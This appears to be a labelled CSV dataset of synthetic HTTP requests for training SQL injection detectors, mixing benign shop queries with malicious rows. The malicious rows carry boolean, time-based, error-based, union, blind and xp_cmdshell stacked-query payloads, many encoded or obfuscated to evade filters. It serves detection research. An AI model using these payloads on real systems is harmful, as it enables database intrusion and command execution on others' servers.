timestamp,source_ip,method,url,params,body,headers,raw_query,is_malicious,attack_type,insertion_point,mutation_type,orig_payload_id,difficulty_score,source_file,Query,Label,Attack_Type,query_hash
2025-04-06T19:13:10Z,10.216.XXX.XXX,GET,/product,"{""id"": ""react documentation price"", ""ref"": ""Fast delivery""}",,,GET /product?id=react documentation price&ref=Fast delivery HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,b06c36ecf1fad2e7f1fcf31daa91327a
2025-05-07T16:14:59Z,10.18.XXX.XXX,GET,/item,"{""id"": ""Music""}",,,GET /item?id=Music HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4259b83d59c95d7482b41888fd249c3f
2025-10-03T08:14:26Z,10.78.XXX.XXX,GET,/item,"{""id"": ""Music""}",,,GET /item?id=Music HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,4259b83d59c95d7482b41888fd249c3f
2025-01-28T18:53:20Z,10.101.XXX.XXX,POST,/comment,,username=admin%27+Or+%271%27%3D%271%27--%2500&comment=93,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin%27+Or+%271%27%3D%271%27--%2500&comment=93",1.0,boolean,body_form,none,p0146,0.3,dataset.csv,,,,ad20f4208cde392d0938f46c4c175261
2025-01-23T16:40:42Z,10.139.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""clothing"",""min_price"":990}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""clothing"",""min_price"":990}}}}",0.0,,,,,0.0,dataset.csv,,,,02943d8e4381f7da10ec3e33ce949aee
2025-02-11T10:59:48Z,10.213.XXX.XXX,GET,/search,"{""q"": ""Pants""}",,,GET /search?q=Pants HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f47822f0f58815a4af3f27c99df4cb53
2025-05-14T09:37:30Z,10.146.XXX.XXX,GET,/search,"{""q"": ""Pants""}",,,GET /search?q=Pants HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f47822f0f58815a4af3f27c99df4cb53
2025-03-10T06:42:42Z,10.72.XXX.XXX,GET,/search,"{""q"": ""Pants""}",,,GET /search?q=Pants HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f47822f0f58815a4af3f27c99df4cb53
2025-07-06T16:11:13Z,10.234.XXX.XXX,POST,/comment,,username=10&comment=watch price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=10&comment=watch price",0.0,,,,,0.0,dataset.csv,,,,b26cd2649c8652d9cbe97b3db6e90574
2025-08-24T03:34:39Z,10.141.XXX.XXX,POST,/api/search,,"{{""user"":""game price"",""query"":""' OR 1=1#%00""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""game price"",""query"":""' OR 1=1#%00""}}",1.0,boolean,body_json,none,p0004,0.4,dataset.csv,,,,5a6bf5ab2eed33220428d4b963cfb3ba
2025-10-26T07:29:42Z,10.216.XXX.XXX,GET,/product,"{""id"": ""1' OR 1=1%00"", ""ref"": ""best travel destinations""}",,,GET /product?id=1' OR 1=1%00&ref=best travel destinations HTTP/1.1,1.0,boolean,query_param,none,p0012,0.2,dataset.csv,,,,d74271cd79b0befebb712e7ba2c28050
2025-10-26T13:48:12Z,10.227.XXX.XXX,GET,/product,"{""id"": ""flight tickets price"", ""ref"": ""WATCH""}",,,GET /product?id=flight tickets price&ref=WATCH HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3836f46b720f3555b398574ada8e0995
2025-04-07T18:52:30Z,10.1.XXX.XXX,GET,/product,"{""id"": ""best sofa"", ""ref"": ""admin%2527%2520OR%25201%253D1--""}",,,GET /product?id=best sofa&ref=admin%2527%2520OR%25201%253D1-- HTTP/1.1,1.0,header-injection,query_param,whitespace_obf,p0109,0.5,dataset.csv,,,,f37c5af1e1556ff962c94e7b6f77fdc3
2025-08-03T17:24:30Z,10.112.XXX.XXX,POST,/comment,,username=hotel booking&comment=table 2025,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=hotel booking&comment=table 2025",0.0,,,,,0.0,dataset.csv,,,,a12c6e8517f01fb1a7953092bb6706de
2025-05-12T12:26:55Z,10.211.XXX.XXX,POST,/comment,,username=96&comment=pants price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=96&comment=pants price",0.0,,,,,0.0,dataset.csv,,,,407e24c930c4f74c902aa7ad72d02588
2025-07-10T16:58:32Z,10.40.XXX.XXX,POST,/comment,,username=62&comment=JACKET,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=62&comment=JACKET",0.0,,,,,0.0,dataset.csv,,,,925b663e71d955b22fcd5195706e4f31
2025-08-18T08:40:29Z,10.242.XXX.XXX,POST,/api/search,,"{{""user"":""92"",""query"":""93""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""92"",""query"":""93""}}",0.0,,,,,0.0,dataset.csv,,,,fdaf5a721c6a9acb922e69ba14fb970b
2025-07-10T21:21:32Z,10.131.XXX.XXX,GET,/item,"{""id"": ""' And gEOMeTrycoLlectioN((SEleCT*FrOm(SEleCt USEr())A))--""}",,,GET /item?id=' And gEOMeTrycoLlectioN((SEleCT*FrOm(SEleCt USEr())A))-- HTTP/1.1,1.0,error,query_param,whitespace_obf,p0067,0.5,dataset.csv,,,,2808f87dd289de5bc0e4a8205dee3e45
2025-06-21T12:57:23Z,10.119.XXX.XXX,POST,/comment,,username=Game&comment=desk price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=Game&comment=desk price",0.0,,,,,0.0,dataset.csv,,,,0b30e3c03fa79f97e082c450346e5467
2025-03-06T19:07:08Z,10.129.XXX.XXX,GET,/search,"{""q"": ""%27%20%41%4e%44%20%67%74%69%64%5f%73%75%62%73%65%74%28%76%65%72%73%69%6f%6e%28%29%2c%31%29%2d%2d""}",,,GET /search?q=%27%20%41%4e%44%20%67%74%69%64%5f%73%75%62%73%65%74%28%76%65%72%73%69%6f%6e%28%29%2c%31%29%2d%2d HTTP/1.1,1.0,error,query_param,hex,p0165,1.0,dataset.csv,,,,0846afaa8b30e9282ac855fa6b4513b4
2025-04-26T09:45:30Z,10.7.XXX.XXX,GET,/search,"{""q"": ""%27%20%41%4e%44%20%67%74%69%64%5f%73%75%62%73%65%74%28%76%65%72%73%69%6f%6e%28%29%2c%31%29%2d%2d""}",,,GET /search?q=%27%20%41%4e%44%20%67%74%69%64%5f%73%75%62%73%65%74%28%76%65%72%73%69%6f%6e%28%29%2c%31%29%2d%2d HTTP/1.1,1.0,error,query_param,url_encode,p0165,0.4,dataset.csv,,,,0846afaa8b30e9282ac855fa6b4513b4
2025-05-21T21:13:07Z,10.90.XXX.XXX,POST,/comment,,username=travel destinations 2025&comment=%27+OR+%27something%27%3D%27something%2500%2500,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=travel destinations 2025&comment=%27+OR+%27something%27%3D%27something%2500%2500",1.0,boolean,body_form,case_obf,p0010,0.6000000000000001,dataset.csv,,,,f8fa39ac12fb8f1456cd944660a2aa45
2025-05-07T00:11:25Z,10.196.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""%27%20Or%201%3D1#"",""min_price"":538}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""%27%20Or%201%3D1#"",""min_price"":538}}}}",1.0,boolean,body_json,url_encode,p0003,0.6,dataset.csv,,,,c4862417a5c1b072c181c0e557e41253
2025-07-05T15:55:59Z,10.250.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""clothing"",""min_price"":923}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""clothing"",""min_price"":923}}}}",0.0,,,,,0.0,dataset.csv,,,,74b26288a4d52cc25eb85167fd6450ba
2025-04-26T05:26:45Z,10.150.XXX.XXX,GET,/search,"{""q"": ""' AND gtid_subset(version(),1)--%00""}",,,"GET /search?q=' AND gtid_subset(version(),1)--%00 HTTP/1.1",1.0,error,query_param,none,p0061,0.2,dataset.csv,,,,227ce99d022b7875415752f6acf841b6
2025-03-10T17:20:32Z,10.220.XXX.XXX,GET,/search,"{""q"": ""' AND gtid_subset(version(),1)--%00""}",,,"GET /search?q=' AND gtid_subset(version(),1)--%00 HTTP/1.1",1.0,error,query_param,none,p0165,0.2,dataset.csv,,,,227ce99d022b7875415752f6acf841b6
2025-06-08T13:42:20Z,10.243.XXX.XXX,GET,/item,"{""id"": ""(' AND 1=(SELECT 1 FROM pg_sleep(5))#)%00""}",,,GET /item?id=(' AND 1=(SELECT 1 FROM pg_sleep(5))#)%00 HTTP/1.1,1.0,time-based,query_param,url_encode,p0151,0.4,dataset.csv,,,,d82a1b8404a80d754d90179d2e78b8fd
2025-07-28T10:19:43Z,10.234.XXX.XXX,POST,/comment,,username=hotel booking price&comment=best mysql database,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=hotel booking price&comment=best mysql database",0.0,,,,,0.0,dataset.csv,,,,08ae2e2f8543bcaebf78b4cd6a1a751b
2025-07-04T12:21:50Z,10.82.XXX.XXX,GET,/product,"{""id"": ""fitness tips"", ""ref"": ""travel destinations review""}",,,GET /product?id=fitness tips&ref=travel destinations review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f4eacd41d74f6914fa6b3a7531776d87
2025-03-09T19:50:51Z,10.109.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""clothing"",""min_price"":462}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""clothing"",""min_price"":462}}}}",0.0,,,,,0.0,dataset.csv,,,,1e3212179e0f428b8ff980922d8d2ea0
2025-10-26T14:59:40Z,10.234.XXX.XXX,GET,/search,"{""q"": ""shoes review""}",,,GET /search?q=shoes review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,794bf839417079fe73b8b903417f4441
2025-01-02T18:53:26Z,10.14.XXX.XXX,GET,/search,"{""q"": ""shoes review""}",,,GET /search?q=shoes review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,794bf839417079fe73b8b903417f4441
2025-08-20T05:31:08Z,10.130.XXX.XXX,GET,/search,"{""q"": ""shoes review""}",,,GET /search?q=shoes review HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,794bf839417079fe73b8b903417f4441
2025-04-07T21:22:36Z,10.0.XXX.XXX,GET,/product,"{""id"": ""hat"", ""ref"": ""chair price""}",,,GET /product?id=hat&ref=chair price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,6f4a0216bfe91879eb65bf1030184983
2025-01-13T03:44:51Z,10.121.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""clothing"",""min_price"":315}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""clothing"",""min_price"":315}}}}",0.0,,,,,0.0,dataset.csv,,,,d0272059db73475a9a009412b6ecfa23
2025-04-02T08:18:26Z,10.227.XXX.XXX,GET,/search,"{""q"": ""best phone""}",,,GET /search?q=best phone HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,e4bcc20941b873cc51f4fc6d85e563cf
2025-02-15T21:15:21Z,10.145.XXX.XXX,GET,/search,"{""q"": ""best phone""}",,,GET /search?q=best phone HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,e4bcc20941b873cc51f4fc6d85e563cf
2025-09-10T03:19:16Z,10.142.XXX.XXX,GET,/search,"{""q"": ""best phone""}",,,GET /search?q=best phone HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,e4bcc20941b873cc51f4fc6d85e563cf
2025-04-28T08:29:55Z,10.207.XXX.XXX,GET,/product,"{""id"": ""74"", ""ref"": ""Desk""}",,,GET /product?id=74&ref=Desk HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,b3b80cd89cf965079188fc2bc54a7f93
2025-07-27T23:58:15Z,10.7.XXX.XXX,GET,/search,"{""q"": ""laptop 2025""}",,,GET /search?q=laptop 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,de5740c483b1a07c5b443df3b133b11b
2025-07-08T10:51:14Z,10.91.XXX.XXX,GET,/search,"{""q"": ""laptop 2025""}",,,GET /search?q=laptop 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,de5740c483b1a07c5b443df3b133b11b
2025-06-18T07:13:39Z,10.31.XXX.XXX,GET,/search,"{""q"": ""laptop 2025""}",,,GET /search?q=laptop 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,de5740c483b1a07c5b443df3b133b11b
2025-01-01T10:19:53Z,10.36.XXX.XXX,POST,/comment,,username=32&comment=music,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=32&comment=music",0.0,,,,,0.0,dataset.csv,,,,78366ae5f12cc27e769a54a00809f588
2025-04-22T08:45:25Z,10.141.XXX.XXX,POST,/comment,,username=%27%3B%2F%2A%2A%2FEXEC%2F%2A%2A%2Fmaster..xp_cmdshell%2F%2A%2A%2F%27whoami%27--&comment=best phone,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=%27%3B%2F%2A%2A%2FEXEC%2F%2A%2A%2Fmaster..xp_cmdshell%2F%2A%2A%2F%27whoami%27--&comment=best phone",1.0,stacked,body_form,none,p0173,0.4,dataset.csv,,,,7ce47b3d8d5045c9b456b9212087e206
2025-10-21T16:48:27Z,10.126.XXX.XXX,GET,/item,"{""id"": ""bed""}",,,GET /item?id=bed HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,d5c5ee3fd75f3a6c5e464f59d591344e
2025-04-24T22:23:54Z,10.68.XXX.XXX,GET,/item,"{""id"": ""bed""}",,,GET /item?id=bed HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,d5c5ee3fd75f3a6c5e464f59d591344e
2025-10-15T18:54:19Z,10.215.XXX.XXX,GET,/item,"{""id"": ""bed""}",,,GET /item?id=bed HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,d5c5ee3fd75f3a6c5e464f59d591344e
2025-07-03T11:08:41Z,10.18.XXX.XXX,GET,/item,"{""id"": ""battery 2025""}",,,GET /item?id=battery 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,08c6bec19ee686226599534d14f2a6a6
2025-03-16T07:51:41Z,10.0.XXX.XXX,GET,/item,"{""id"": ""battery 2025""}",,,GET /item?id=battery 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,08c6bec19ee686226599534d14f2a6a6
2025-07-09T15:35:43Z,10.194.XXX.XXX,GET,/item,"{""id"": ""battery 2025""}",,,GET /item?id=battery 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,08c6bec19ee686226599534d14f2a6a6
2025-04-04T21:34:21Z,10.74.XXX.XXX,GET,/product,"{""id"": ""scooter"", ""ref"": ""54""}",,,GET /product?id=scooter&ref=54 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,744fc0a16f044d0044439c82fb4f6f34
2025-02-19T05:08:10Z,10.136.XXX.XXX,GET,/item/9390/details,,,,GET /item/9390/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f5ffb3809a307d1697c1cac8765a0448
2025-05-04T22:45:53Z,10.155.XXX.XXX,POST,/comment,,username=78&comment=MScgVU5JT04gU0VMRUNUIEBAdmVyc2lvbixOVUxMLE5VTEwtLQ%3D%3D%2500,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=78&comment=MScgVU5JT04gU0VMRUNUIEBAdmVyc2lvbixOVUxMLE5VTEwtLQ%3D%3D%2500",1.0,union,body_form,double_encode,p0047,0.8,dataset.csv,,,,a5c3a4431d04cf41d72984e298bc6796
2025-05-14T17:07:08Z,10.21.XXX.XXX,GET,/search,"{""q"": ""JyBBTkQgU1VCU1RSSU5HKHZlcnNpb24oKSwxLDEpPSc1Jy0t""}",,,GET /search?q=JyBBTkQgU1VCU1RSSU5HKHZlcnNpb24oKSwxLDEpPSc1Jy0t HTTP/1.1,1.0,blind,query_param,whitespace_obf,p0098,0.5,dataset.csv,,,,2c0036cc6c17ad86a762c4aaf33c7878
2025-06-11T19:43:46Z,192.168.XXX.XXX,GET,/search,"{""q"": ""JyBBTkQgU1VCU1RSSU5HKHZlcnNpb24oKSwxLDEpPSc1Jy0t""}",,,GET /search?q=JyBBTkQgU1VCU1RSSU5HKHZlcnNpb24oKSwxLDEpPSc1Jy0t HTTP/1.1,1.0,blind,query_param,base64,p0098,1.0,dataset.csv,,,,2c0036cc6c17ad86a762c4aaf33c7878
2025-02-28T07:09:27Z,10.113.XXX.XXX,POST,/comment,,username=chair 2025&comment=hotel booking price,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=chair 2025&comment=hotel booking price",0.0,,,,,0.0,dataset.csv,,,,904a806a5dacf692a28e7c346ef3f661
2025-01-30T12:32:37Z,10.121.XXX.XXX,POST,/api/search,,"{{""user"":""11"",""query"":""41""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""11"",""query"":""41""}}",0.0,,,,,0.0,dataset.csv,,,,93d5363412106d0acb5c6f5dcfec6d5a
2025-07-18T01:36:41Z,10.196.XXX.XXX,GET,/search,"{""q"": ""1%2527%2520OR%2520%25271%2527%253D%25271%2527%2520LIMIT%25201--""}",,,GET /search?q=1%2527%2520OR%2520%25271%2527%253D%25271%2527%2520LIMIT%25201-- HTTP/1.1,1.0,boolean,query_param,url_encode,p0033,0.4,dataset.csv,,,,5bba6fb0392e030c58642e349d101387
2025-07-27T12:19:44Z,10.194.XXX.XXX,GET,/item,"{""id"": ""1 ' OR '1'='1' #""}",,,GET /item?id=1 ' OR '1'='1' # HTTP/1.1,1.0,boolean,query_param,none,p0159,0.2,dataset.csv,,,,a846b9ff42047d4444b8cde4bd74aa5f
2025-10-28T23:07:31Z,10.35.XXX.XXX,POST,/api/search,,"{{""user"":""61"",""query"":""user123""}}","{""Content-Type"": ""application/json""}","POST /api/search HTTP/1.1
Content-Type: application/json

{{""user"":""61"",""query"":""user123""}}",0.0,,,,,0.0,dataset.csv,,,,63bcf48fa3e2d68f98f4ea908e539f82
2025-09-06T19:10:53Z,10.53.XXX.XXX,GET,/search,"{""q"": ""((';\nEXEC\nmaster..xp_cmdshell\n'whoami'#))""}",,,"GET /search?q=((';
EXEC
master..xp_cmdshell
'whoami'#)) HTTP/1.1",1.0,stacked,query_param,whitespace_obf,p0152,0.5,dataset.csv,,,,2f39c4d186c82ef5a811f82ae248c4c5
2025-08-07T06:57:26Z,10.103.XXX.XXX,GET,/search,"{""q"": ""((';\nEXEC\nmaster..xp_cmdshell\n'whoami'#))""}",,,"GET /search?q=((';
EXEC
master..xp_cmdshell
'whoami'#)) HTTP/1.1",1.0,stacked,query_param,comment_insert,p0152,0.6,dataset.csv,,,,2f39c4d186c82ef5a811f82ae248c4c5
2025-02-05T07:36:47Z,10.136.XXX.XXX,GET,/search,"{""q"": ""((';\nEXEC\nmaster..xp_cmdshell\n'whoami'#))""}",,,"GET /search?q=((';
EXEC
master..xp_cmdshell
'whoami'#)) HTTP/1.1",1.0,stacked,query_param,case_obf,p0152,0.5,dataset.csv,,,,2f39c4d186c82ef5a811f82ae248c4c5
2025-03-04T12:45:20Z,10.234.XXX.XXX,POST,/comment,,username=1%2520OR%25201%3D1%2500%2500%2500&comment=Shirt,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=1%2520OR%25201%3D1%2500%2500%2500&comment=Shirt",1.0,boolean,body_form,base64,p0027,1.0,dataset.csv,,,,e9697231246cdd321cd6023ffec83c72
2025-06-14T16:38:35Z,10.250.XXX.XXX,POST,/comment,,username=1%2BOR%2B1%3D1&comment=Book,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=1%2BOR%2B1%3D1&comment=Book",1.0,boolean,body_form,double_encode,p0027,0.8,dataset.csv,,,,b4049d9882cabee35c50954037a2ccc0
2025-09-30T16:43:06Z,10.237.XXX.XXX,POST,/api/filter,,"{{""filters"":{{""category"":""%27%20OR%20%271%27%20LIKE%20%271"",""min_price"":34}}}}","{""Content-Type"": ""application/json""}","POST /api/filter HTTP/1.1
Content-Type: application/json

{{""filters"":{{""category"":""%27%20OR%20%271%27%20LIKE%20%271"",""min_price"":34}}}}",1.0,boolean,body_json,whitespace_obf,p0133,0.7,dataset.csv,,,,ede614c08583dc5ec332f1ee3dcd8c03
2025-10-18T13:50:13Z,10.10.XXX.XXX,POST,/comment,,username=Desk&comment=97,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=Desk&comment=97",0.0,,,,,0.0,dataset.csv,,,,67352b583f41c2db278aa258db47e25f
2025-01-18T02:49:36Z,10.215.XXX.XXX,GET,/product,"{""id"": ""22"", ""ref"": ""best web development""}",,,GET /product?id=22&ref=best web development HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,3588ad694843b600e583b40617b3117d
2025-10-21T04:37:52Z,10.163.XXX.XXX,GET,/search,"{""q"": ""'+AND+JSON_KEYS((SELECT+CONVERT((SELECT+CONCAT('~',version()))+USING+utf8)))--%00""}",,,"GET /search?q='+AND+JSON_KEYS((SELECT+CONVERT((SELECT+CONCAT('~',version()))+USING+utf8)))--%00 HTTP/1.1",1.0,error,query_param,url_encode,p0172,0.4,dataset.csv,,,,9d04a36f3536fde3ed0fb45cc8178db7
2025-01-30T13:05:24Z,10.66.XXX.XXX,GET,/search,"{""q"": ""'+AND+JSON_KEYS((SELECT+CONVERT((SELECT+CONCAT('~',version()))+USING+utf8)))--%00""}",,,"GET /search?q='+AND+JSON_KEYS((SELECT+CONVERT((SELECT+CONCAT('~',version()))+USING+utf8)))--%00 HTTP/1.1",1.0,error,query_param,double_encode,p0172,0.7,dataset.csv,,,,9d04a36f3536fde3ed0fb45cc8178db7
2025-01-11T20:46:39Z,10.43.XXX.XXX,GET,/search,"{""q"": ""'+AND+JSON_KEYS((SELECT+CONVERT((SELECT+CONCAT('~',version()))+USING+utf8)))--%00""}",,,"GET /search?q='+AND+JSON_KEYS((SELECT+CONVERT((SELECT+CONCAT('~',version()))+USING+utf8)))--%00 HTTP/1.1",1.0,error,query_param,whitespace_obf,p0062,0.5,dataset.csv,,,,9d04a36f3536fde3ed0fb45cc8178db7
2025-08-19T08:41:07Z,10.197.XXX.XXX,GET,/product,"{""id"": ""1' AND SLEEP(5)#%00"", ""ref"": ""battery""}",,,GET /product?id=1' AND SLEEP(5)#%00&ref=battery HTTP/1.1,1.0,time-based,query_param,none,p0072,0.2,dataset.csv,,,,67cd15012b9b59388b1b9c98e1cab0ce
2025-05-14T15:01:01Z,10.216.XXX.XXX,GET,/product,"{""id"": ""95"", ""ref"": ""PANTS""}",,,GET /product?id=95&ref=PANTS HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,515d7b4afe0fd67e16ec37931ba792d1
2025-09-30T04:12:27Z,10.204.XXX.XXX,POST,/comment,,username=game price&comment=web development 2025,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=game price&comment=web development 2025",0.0,,,,,0.0,dataset.csv,,,,5d0c0a4e1279f147fdac197309d8ba32
2025-02-02T12:57:07Z,10.133.XXX.XXX,GET,/product,"{""id"": ""shelf"", ""ref"": ""Movie""}",,,GET /product?id=shelf&ref=Movie HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,9fa70b8249a84bf1483178f49f876f08
2025-07-21T19:23:04Z,10.45.XXX.XXX,GET,/product,"{""id"": ""bob"", ""ref"": ""shirt price""}",,,GET /product?id=bob&ref=shirt price HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,f6e621e71f8cf7c2908246a7bb756c2f
2025-10-13T18:37:53Z,10.45.XXX.XXX,POST,/comment,,username=laptop price&comment=85,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=laptop price&comment=85",0.0,,,,,0.0,dataset.csv,,,,790b70e74fb9913d526827b8efba8a66
2025-10-22T11:59:07Z,10.122.XXX.XXX,GET,/search,"{""q"": ""shirt 2025""}",,,GET /search?q=shirt 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,5e34893c904ec10e849e9b64969d4d2e
2025-08-26T09:23:42Z,10.177.XXX.XXX,GET,/search,"{""q"": ""shirt 2025""}",,,GET /search?q=shirt 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,5e34893c904ec10e849e9b64969d4d2e
2025-03-06T09:14:07Z,10.250.XXX.XXX,GET,/search,"{""q"": ""shirt 2025""}",,,GET /search?q=shirt 2025 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,5e34893c904ec10e849e9b64969d4d2e
2025-03-04T15:42:39Z,10.197.XXX.XXX,GET,/product,"{""id"": ""helmet price"", ""ref"": ""1'/**/AND/**/CHAR(65)='A""}",,,GET /product?id=helmet price&ref=1'/**/AND/**/CHAR(65)='A HTTP/1.1,1.0,blind,query_param,none,p0105,0.2,dataset.csv,,,,5430d5cb8e5549b552d4847a2123336b
2025-07-06T10:30:52Z,10.232.XXX.XXX,POST,/comment,,username=desk review&comment=Sofa,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=desk review&comment=Sofa",0.0,,,,,0.0,dataset.csv,,,,4abb04f8d657d62fd88018e714ea0c31
2025-02-21T04:55:16Z,10.45.XXX.XXX,POST,/comment,,username=desk review&comment=Sofa,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=desk review&comment=Sofa",0.0,,,,,0.0,dataset.csv,,,,4abb04f8d657d62fd88018e714ea0c31
2025-02-01T05:44:35Z,10.0.XXX.XXX,POST,/comment,,username=game 2025&comment=best javascript guide,"{""Content-Type"": ""application/x-www-form-urlencoded""}","POST /comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=game 2025&comment=best javascript guide",0.0,,,,,0.0,dataset.csv,,,,2cb31660c48bc5c8cd5ceeabe4b8d6ac
2025-09-04T13:02:24Z,10.180.XXX.XXX,GET,/item/5942/details,,,,GET /item/5942/details HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,ecba9cf1e70ccfce4bdb23d2694151bc
2025-03-21T19:16:03Z,10.131.XXX.XXX,GET,/product,"{""id"": ""bag price"", ""ref"": ""16""}",,,GET /product?id=bag price&ref=16 HTTP/1.1,0.0,,,,,0.0,dataset.csv,,,,387926267e5d48f85c049270564d192c
